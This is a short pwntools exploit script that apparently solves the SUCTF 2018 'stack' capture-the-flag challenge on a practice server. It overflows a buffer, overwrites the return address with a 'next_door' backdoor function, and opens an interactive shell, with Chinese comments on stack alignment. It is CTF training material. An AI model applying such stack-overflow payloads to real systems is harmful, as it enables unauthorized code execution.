from pwn import *

# io = process('./SUCTF_2018_stack')
io = remote('node4.buuoj.cn',28660)
elf = ELF('./SUCTF_2018_stack')

backdoor = elf.sym['next_door']
backdoor = 0x400677
# ret_addr = 0x40068B
#本题只能采用将push rbp去掉的方式来平衡堆栈（Ubantu18），不能采用加ret_addr，原因是只能溢出0x30字节
#用第二种方式溢出了0x38字节
payload = b'a'*(0x20+8) + p64(backdoor)
# payload = b'a'*(0x20+8)+ p64(ret_addr) + p64(backdoor)
io.recv()
io.send(payload)
io.interactive()
